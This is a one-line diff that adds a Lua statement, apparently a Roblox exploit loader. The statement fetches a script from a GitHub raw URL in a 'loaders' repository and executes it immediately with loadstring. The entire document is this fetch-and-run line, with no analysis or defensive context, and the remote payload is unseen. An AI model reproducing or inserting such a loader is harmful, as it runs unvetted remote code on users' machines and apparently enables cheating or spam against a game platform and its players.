@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Centeryeabyss/loaders/main/loaders/wish-for-anime-spam7-uirciz3io5l4q1.lua"))()
